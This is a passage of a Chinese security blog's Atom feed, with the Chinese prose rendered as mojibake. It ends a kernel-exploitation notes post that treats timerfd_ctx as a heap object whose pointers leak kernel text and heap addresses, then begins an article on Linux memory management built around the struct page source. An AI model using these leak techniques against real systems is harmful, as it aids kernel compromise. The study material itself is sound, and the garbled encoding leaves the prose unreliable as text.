<code>timerfd_release</code> å®šä¹‰äº <code>fs/timerfd.c</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">timerfd_release</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span> =</span> file-&gt;private_data;</span><br><span class="line"></span><br><span class="line">    timerfd_remove_cancel(ctx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isalarm(ctx))</span><br><span class="line">        alarm_cancel(&amp;ctx-&gt;t.alarm);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        hrtimer_cancel(&amp;ctx-&gt;t.tmr);</span><br><span class="line">    kfree_rcu(ctx, rcu);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å³æˆ‘ä»¬å¯ä»¥é€šè¿‡å…³é—­ timerfd æ–‡ä»¶æ¥é‡Šæ”¾ timerfd_ctx ç»“æ„ä½“</p><h3 id="æ•°æ®æ³„éœ²-7"><a href="#æ•°æ®æ³„éœ²-7" class="headerlink" title="æ•°æ®æ³„éœ²"></a>æ•°æ®æ³„éœ²</h3><h4 id="å†…æ ¸-text-æ®µåœ°å€-5"><a href="#å†…æ ¸-text-æ®µåœ°å€-5" class="headerlink" title="å†…æ ¸ .text æ®µåœ°å€"></a>å†…æ ¸ .text æ®µåœ°å€</h4><p>timerfd_ctx çš„ tmr å­—æ®µçš„ <code>function</code> å­—æ®µæŒ‡å‘å†…æ ¸ä»£ç æ®µï¼ˆç¬”è€…å°šæœªæ±‚è¯å…·ä½“æŒ‡å‘å‡½æ•°ï¼‰ï¼Œè‹¥èƒ½æ³„æ¼å‡ºè¯¥æŒ‡é’ˆåˆ™æˆ‘ä»¬ä¾¿æ¯«æ— ç–‘é—®èƒ½æ³„æ¼å‡ºå†…æ ¸åŸºå€</p><h4 id="å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-4"><a href="#å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ-direct-mapping-areaï¼‰-4" class="headerlink" title="*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰"></a><em>*å†…æ ¸çº¿æ€§æ˜ å°„åŒºï¼ˆ direct mapping areaï¼‰</em></h4><p>timerfd_ctx çš„ tmr å­—æ®µçš„ <code>base</code> å­—æ®µæŒ‡å‘å†…æ ¸â€œå †â€ä¸Šï¼Œè‹¥èƒ½æ³„éœ²è¯¥å­—æ®µæˆ‘ä»¬åŒæ ·èƒ½æ³„æ¼å‡ºå†…æ ¸çš„â€œå †ä¸Šåœ°å€â€</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æˆ‘æ˜¯å°å°åšé¢˜å®¶&lt;/p&gt;</summary>
    
    
    
    <category term="PWN" scheme="http://blog.arttnba3.cn/categories/PWN/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="å­¦ä¹ æœ­è®°" scheme="http://blog.arttnba3.cn/tags/%E5%AD%A6%E4%B9%A0%E6%9C%AD%E8%AE%B0/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>ã€OS.0x02ã€‘Linux Kernel å†…å­˜ç®¡ç†æµ…æ I - é¡µã€åŒºã€èŠ‚ç‚¹</title>
    <link href="http://blog.arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/"/>
    <id>http://blog.arttnba3.cn/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/</id>
    <published>2021-11-27T18:45:29.000Z</published>
    <updated>2022-07-05T16:34:52.342Z</updated>
    
    <content type="html"><![CDATA[<p>æ— å†…é¬¼ï¼Œæ¥ç‚¹å†…å­˜æ¡</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><p>æœ¬ç³»åˆ—æ–‡ç« å°†é€šè¿‡ Linux 5.11 çš„æºä»£ç ç®€è¦åˆ†æ Linux å†…æ ¸ä¸­çš„<strong>å†…å­˜ç®¡ç†</strong>ï¼ˆmemory managementï¼‰éƒ¨åˆ†ï¼Œç¬”è€…é€‰æ‹©é‡‡ç”¨è‡ªåº•å‘ä¸Šçš„æ–¹å¼æ¥é€å±‚åˆ†æï¼Œæœ¬ç¯‡æ–‡ç« ä¾¿ä»æœ€åŸºç¡€çš„<strong>é¡µæ¡†</strong>å¼€å§‹è¿›è¡Œåˆ†æ</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>è¿™æ˜¯ä¸€å¼ ååˆ†ç»å…¸çš„ _Overview_ï¼Œè‡ªé¡¶å‘ä¸‹æ˜¯</p><ul><li><strong>èŠ‚ç‚¹</strong>ï¼ˆnodeï¼Œå¯¹åº”ç»“æ„ä½“ pgdata_listï¼‰</li><li><strong>åŒº</strong>ï¼ˆzoneï¼Œå¯¹åº”ç»“æ„ä½“ zoneï¼Œå›¾ä¸Šå±•ç¤ºäº†ä¸‰ç§ç±»å‹çš„ zoneï¼‰</li><li><strong>é¡µ</strong>ï¼ˆpageï¼Œå¯¹åº”ç»“æ„ä½“ pageï¼‰</li></ul><p><img src="https://i.loli.net/2021/11/28/OrsvS6GTMgPLx5E.png" alt="image.png"></p><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>cat /proc/buddyinfo</code> ä¸ <code>cat /proc/pagetypeinfo</code> æŸ¥çœ‹é¡µé¢ç›¸å…³ä¿¡æ¯ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">arttnba3@ubuntu:~$ sudo cat /proc/buddyinfo </span><br><span class="line">Node 0, zone      DMA      0      1      1      0      2      1      1      0      1      2      2 </span><br><span class="line">Node 0, zone    DMA32   8706   1386    748    543    232     48     39      9      0      0      0 </span><br><span class="line">Node 0, zone   Normal  15391   3317    877    826    221     77     14      2      0      0      0 </span><br><span class="line">arttnba3@ubuntu:~$ sudo cat /proc/pagetypeinfo </span><br><span class="line">Page block order: 9</span><br><span class="line">Pages per block:  512</span><br><span class="line"></span><br><span class="line">Free pages count per migrate type at order       0      1      2      3      4      5      6      7      8      9     10 </span><br><span class="line">Node    0, zone      DMA, type    Unmovable      0      1      1      0      2      1      1      0      1      1      0 </span><br><span class="line">Node    0, zone      DMA, type      Movable      0      0      0      0      0      0      0      0      0      1      2 </span><br><span class="line">Node    0, zone      DMA, type  Reclaimable      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone      DMA, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone      DMA, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type    Unmovable    254    166     54     33     18      8     11      1      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type      Movable   6762    740    535    278     43      3      3      2      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type  Reclaimable   1690    480    159    232    171     37     25      6      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone    DMA32, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type    Unmovable     27     30     15      0      1      4      4      2      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type      Movable  12963   3039    806    727    197     68     10      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type  Reclaimable   1135    251     56     99     23      5      0      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type   HighAtomic      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line">Node    0, zone   Normal, type      Isolate      0      0      0      0      0      0      0      0      0      0      0 </span><br><span class="line"></span><br><span class="line">Number of blocks type     Unmovable      Movable  Reclaimable   HighAtomic      Isolate </span><br><span class="line">Node 0, zone      DMA            3            5            0            0            0 </span><br><span class="line">Node 0, zone    DMA32           60         1382           86            0            0 </span><br><span class="line">Node 0, zone   Normal          245         4270           93            0            0</span><br></pre></td></tr></table></figure><h1 id="0x01-struct-pageï¼šé¡µ"><a href="#0x01-struct-pageï¼šé¡µ" class="headerlink" title="0x01.struct pageï¼šé¡µ"></a>0x01.struct pageï¼šé¡µ</h1><p>Linux kernel ä¸­ä½¿ç”¨ <code>page</code> ç»“æ„ä½“æ¥è¡¨ç¤ºä¸€ä¸ªç‰©ç†é¡µæ¡†ï¼Œ<strong>æ¯ä¸ªç‰©ç†é¡µæ¡†éƒ½æœ‰ç€ä¸€ä¸ªå¯¹åº”çš„ page ç»“æ„ä½“</strong>ï¼Œä¸ºäº†èŠ‚çœå†…å­˜ç©ºé—´ï¼Œå…¶å®šä¹‰ä¸­ä½¿ç”¨äº†å¤§é‡çš„è”åˆä½“</p><p>ä¸€ä¸ª page ç»“æ„ä½“çš„å¤§å°ä¸º 64Bï¼Œè‹¥æ˜¯æ¯ä¸ªç‰©ç†é¡µæ¡†å¤§å°ä¸º 4KBï¼Œåˆ™ä»…éœ€è¦ç‰ºç‰² <code>1.5625%</code> çš„ç©ºé—´å­˜å‚¨ page ç»“æ„ä½“</p><p>åœ¨è¿™é‡Œç»™å‡ºä¸€å¼  struct page çš„overview</p><blockquote><p>ç½‘ä¸Šæ‰¾çš„å›¾ï¼Œä¾µåˆ </p></blockquote><p><img src="https://i.loli.net/2021/11/25/MjWZmba9SLH1xIO.png" alt="image.png"></p><p>è¯¥ç»“æ„ä½“å®šä¹‰äºå†…æ ¸æºç  <code>include/linux/mm_types.h</code> ä¸­ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">// flags ç”¨ä»¥å­˜å‚¨è¯¥ page çš„æ ‡å¿—ä½ï¼Œæ¯ä¸€ä¸ªä½è¡¨ç¤ºä¸€ç§çŠ¶æ€ï¼Œæ•…ä¸€å¼ é¡µå¯ä»¥æœ‰ 32 ç§çŠ¶æ€ï¼Œè¿™äº›çŠ¶æ€å®šä¹‰äº include/linux/page-flags.h ä¸­</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;        <span class="comment">/* åŸå­å˜é‡ flagï¼Œä¹Ÿå¯èƒ½è¢«å¼‚æ­¥æ›´æ–° */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * è¯¥è”åˆä½“ä¸­ 5 ä¸ª wordï¼ˆ32 ä½ç³»ç»Ÿ20å­—èŠ‚/64ä½ç³»ç»Ÿ40å­—èŠ‚ï¼‰æ˜¯å¯ç”¨çš„</span></span><br><span class="line"><span class="comment">     * è­¦å‘Šï¼šç¬¬ä¸€ä¸ª word çš„ 0 bit ä¾› PageTail()ä½¿ç”¨</span></span><br><span class="line"><span class="comment">     * è¿™æ„å‘³ç€å…¶ä»–ç”¨æˆ·ä½¿ç”¨è¯¥ç»“æ„ä½“æ—¶ã€ç¦æ­¢ã€‘ä½¿ç”¨è¯¥ bit</span></span><br><span class="line"><span class="comment">     * ä»¥é¿å…ç¢°æ’å’Œè¯¯åˆ¤ PageTail().</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* é¡µç¼“å­˜ä¸åŒ¿åé¡µ */</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @lru: Pageout é“¾è¡¨, ä¾‹å¦‚ active_list ä¾¿ç”±</span></span><br><span class="line"><span class="comment">             * lruvec-&gt;lru_lock ä¿æŠ¤ã€‚  </span></span><br><span class="line"><span class="comment">             * æœ‰æ—¶ä¼šè¢«é¡µæ‰€æœ‰è€…ä½œä¸ºå¸¸è§„é“¾è¡¨ä½¿ç”¨ã€‚</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span></span><br><span class="line">            <span class="comment">/* See page-flags.h for PAGE_MAPPING_FLAGS */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span></span><br><span class="line">            <span class="type">pgoff_t</span> index;        <span class="comment">/* åœ¨æ˜ å°„çš„è™šæ‹Ÿç©ºé—´ï¼ˆvma_areaï¼‰å†…çš„åç§» */</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @private: ç§æœ‰æ˜ å°„çš„éé€æ˜æ•°æ®</span></span><br><span class="line"><span class="comment">             * åœ¨ PagePrivate ä¸­é€šå¸¸ç”¨äº buffer_heads.</span></span><br><span class="line"><span class="comment">             * åœ¨ PageSwapCache ä¸­ç”¨äº swp_entry_t</span></span><br><span class="line"><span class="comment">             * åœ¨ PageBuddy ä¸­æŒ‡å®šåœ¨ buddy system ä¸­çš„æ¬¡åº</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* page_pool used by netstack */</span></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">             * @dma_addr: åœ¨ 32 ä½æœºå™¨ä¸Šä»å¯èƒ½éœ€è¦ 64 ä½çš„ç©ºé—´</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="type">dma_addr_t</span> dma_addr;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* ä¾› slab, slob and slub ä½¿ç”¨ */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slab_list</span>;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* Partial pages */</span></span><br><span class="line">                    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">                    <span class="type">int</span> pages;    <span class="comment">/* å‰©ä½™çš„é¡µæ•°é‡ */</span></span><br><span class="line">                    <span class="type">int</span> pobjects;    <span class="comment">/* è¿‘ä¼¼è®¡æ•° */</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pages;</span><br><span class="line">                    <span class="type">short</span> <span class="type">int</span> pobjects;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab_cache</span>;</span> <span class="comment">/* ä¸åœ¨ slob ä¸­ä½¿ç”¨ */</span></span><br><span class="line">            <span class="comment">/* ä¸¤ä¸ª word çš„èŒƒå›´ */</span></span><br><span class="line">            <span class="type">void</span> *freelist;        <span class="comment">/* ç¬¬ä¸€ä¸ªç©ºé—²å¯¹è±¡ */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">void</span> *s_mem;    <span class="comment">/* slab: first object */</span></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> counters;        <span class="comment">/* SLUB */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>            <span class="comment">/* SLUB */</span></span><br><span class="line">                    <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                    <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                    <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* å¤åˆé¡µçš„å°¾é¡µ */</span></span><br><span class="line">            <span class="comment">// å¤åˆé¡µ ï¼ˆcompound pageï¼‰å³ä¸ºå°†å¤šä¸ªç‰©ç†è¿ç»­é¡µæ¡†è§†ä½œä¸€ä¸ªå¤§é¡µ</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> compound_head;    <span class="comment">/* Bit zero is set */</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">/* First tail page only */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> compound_dtor;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">char</span> compound_order;</span><br><span class="line">            <span class="type">atomic_t</span> compound_mapcount;</span><br><span class="line">            <span class="type">unsigned</span> <span class="type">int</span> compound_nr; <span class="comment">/* 1 &lt;&lt; compound_order */</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* Second tail page of compound page */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _compound_pad_1;    <span class="comment">/* compound_head */</span></span><br><span class="line">            <span class="type">atomic_t</span> hpage_pinned_refcount;</span><br><span class="line">            <span class="comment">/* For both global and memcg */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">deferred_list</span>;</span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* é¡µè¡¨é¡µé¢ */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _pt_pad_1;    <span class="comment">/* compound_head */</span></span><br><span class="line">            <span class="type">pgtable_t</span> pmd_huge_pte; <span class="comment">/* protected by page-&gt;ptl */</span></span><br><span class="line">            <span class="type">unsigned</span> <span class="type">long</span> _pt_pad_2;    <span class="comment">/* mapping */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">pt_mm</span>;</span> <span class="comment">/* ç”¨äº x86 çš„å…¨å±€ç›®å½•è¡¨ï¼ˆpgdï¼‰ */</span></span><br><span class="line">                <span class="type">atomic_t</span> pt_frag_refcount; <span class="comment">/* ç”¨äº powerpc æ¶æ„ */</span></span><br><span class="line">            &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ALLOC_SPLIT_PTLOCKS</span></span><br><span class="line">            <span class="type">spinlock_t</span> *ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">            <span class="type">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>    <span class="comment">/* ZONE_DEVICE pages */</span></span><br><span class="line">            <span class="comment">/** @pgmap: Points to the hosting device page map. */</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">dev_pagemap</span> *<span class="title">pgmap</span>;</span></span><br><span class="line">            <span class="type">void</span> *zone_device_data;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * ZONE_DEVICE private pages are counted as being</span></span><br><span class="line"><span class="comment">             * mapped so the next 3 words hold the mapping, index,</span></span><br><span class="line"><span class="comment">             * and private fields from the source anonymous or</span></span><br><span class="line"><span class="comment">             * page cache page while the page is migrated to device</span></span><br><span class="line"><span class="comment">             * private memory.</span></span><br><span class="line"><span class="comment">             * ZONE_DEVICE MEMORY_DEVICE_FS_DAX pages also</span></span><br><span class="line"><span class="comment">             * use the mapping, index, and private fields when</span></span><br><span class="line"><span class="comment">             * pmem backed DAX files are mapped.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** @rcu_head: ä½ å¯ä»¥é€šè¿‡è¯¥æˆå‘˜ä»¥é€šè¿‡ RCU é‡Šæ”¾å†…å­˜é¡µ */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu_head</span>;</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span>        <span class="comment">/* è¿™ä¸ªè”åˆä½“å ç”¨å››ä¸ªå­—èŠ‚ */</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * è‹¥æ˜¯è¿™ä¸ªé¡µè¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´, è®°å½•è¯¥é¡µè¢«é¡µè¡¨å¼•ç”¨çš„æ¬¡æ•°</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">// æ¯ä¸ªè¿›ç¨‹æœ‰å…¶ç‹¬ç«‹çš„é¡µè¡¨ï¼Œæ•…å¯ä»¥ç†è§£ä¸ºè¯¥å€¼è®°å½•äº†è¯¥é¡µè¢«å¤šå°‘ä¸ªè¿›ç¨‹å…±äº«ï¼Œåˆå§‹å€¼ä¸º -1</span></span><br><span class="line">        <span class="type">atomic_t</span> _mapcount;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * è‹¥æ˜¯è¯¥é¡µæ—¢ä¸æ˜¯ PageSlab ä¹Ÿæ²¡æœ‰è¢«æ˜ å°„åˆ°ç”¨æˆ·ç©ºé—´ï¼Œ</span></span><br><span class="line"><span class="comment">         * åˆ™è¯¥å€¼ä¼šå¸®åŠ©å†³å®šè¯¥é¡µçš„ä½œç”¨ã€‚</span></span><br><span class="line"><span class="comment">         * è¯¥å¤„çš„é¡µé¢ç±»å‹åˆ—è¡¨å‚è§ page-flags.h</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> page_type;</span><br><span class="line"></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> active;        <span class="comment">/* SLAB */</span></span><br><span class="line">        <span class="type">int</span> units;            <span class="comment">/* SLOB */</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ä½¿ç”¨è®¡æ•°. ã€ä¸è¦ç›´æ¥ä½¿ç”¨ã€‘. å‚è§ page_ref.h */</span></span><br><span class="line">    <span class="type">atomic_t</span> _refcount;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> memcg_data;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * å½“æœºå™¨ä¸Šçš„æ‰€æœ‰å†…å­˜éƒ½è¢«æ˜ å°„åˆ°å†…æ ¸ç©ºé—´æ—¶,</span></span><br><span class="line"><span class="comment">     * æˆ‘ä»¬å¯ä»¥ç®€å•åœ°è®¡ç®—å…¶è™šæ‹Ÿåœ°å€ã€‚</span></span><br><span class="line"><span class="comment">     * åœ¨æœ‰ç€ã€é«˜ç«¯å†…å­˜ï¼ˆå¤§äº896MBï¼‰ã€‘çš„æœºå™¨ä¸Šï¼Œæœ‰çš„å†…å­˜è¢«åŠ¨æ€åœ°æ˜ å°„åˆ°å†…æ ¸</span></span><br><span class="line"><span class="comment">     * è™šæ‹Ÿç©ºé—´ä¸­ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸€ä¸ªåœ°æ–¹æ¥å­˜å‚¨è¿™ä¸ªåœ°å€</span></span><br><span class="line"><span class="comment">     * åœ¨ x86 æœºå™¨ä¸Šè¿™ä¸ªåŸŸå¯èƒ½å  16 bit çš„ç©ºé—´ ... ;)</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * ä¹˜æ³•è®¡ç®—è¾ƒæ…¢çš„æ¶æ„å¯ä»¥åœ¨ asm/page.h ä¸­å®šä¹‰ WANT_PAGE_VIRTUAL</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="type">void</span> *virtual;            <span class="comment">/* å†…æ ¸è™šæ‹Ÿåœ°å€ (è‹¥é kmapped åˆ™ä¸º NULL, å³é«˜ç«¯å†…å­˜) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span 